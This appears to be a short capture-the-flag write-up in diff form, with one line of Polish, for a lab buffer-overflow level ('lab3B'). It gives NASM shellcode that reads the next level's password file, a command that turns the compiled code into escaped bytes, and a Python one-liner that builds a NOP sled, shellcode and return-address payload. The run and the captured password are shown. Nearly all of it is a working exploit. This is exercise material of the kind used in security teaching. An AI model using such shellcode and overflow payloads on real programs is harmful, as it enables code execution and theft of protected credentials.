@@ -1,0 +1,64 @@
+Musimy napisać shellcode, ktory przeczyta plik:
+/home/lab3A/.pass
+
+root@kali:~/lab03B/2/trzeci# cat test.nasm
+global _start
+section .text
+
+_start:
+	xor eax, eax
+	xor ebx, ebx
+	xor ecx, ecx
+	xor edx, edx
+	jmp two
+
+one:
+	pop ebx
+
+	mov al, 5
+	xor ecx, ecx
+	int 0x80
+
+	mov esi, eax
+	jmp read
+
+exit:
+	mov al, 1
+	xor ebx, ebx
+	int 0x80
+
+read:
+	mov ebx, esi
+	mov al, 3
+	sub esp, 1
+	lea ecx, [esp]
+	mov dl, 1
+	int 0x80
+
+	xor ebx, ebx
+	cmp ebx, eax
+	je exit
+
+	mov al, 4
+	mov bl, 1
+	mov dl, 1
+	int 0x80
+
+	add esp,1
+	jmp read
+
+two:
+	call one
+	string DB '/home/lab3A/.pass', 0
+
+root@kali:~/lab03B/2/trzeci# objdump -d ./test|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x6c\x61\x62\x33\x41\x2f\x2e\x70\x61\x73\x73"
+root@kali:~/lab03B/2/trzeci#
+
+
+lab3B@warzone:/levels/lab03$ python -c 'print "\x90"*74+"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x6c\x61\x62\x33\x41\x2f\x2e\x70\x61\x73\x73"+"\x00\x70\xfd\xb7"+"D"*80' > /tmp/abcd
+lab3B@warzone:/levels/lab03$ ./lab3B < /tmp/abcd
+just give me some shellcode, k
+wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
+child is exiting...
+lab3B@warzone:/levels/lab03$
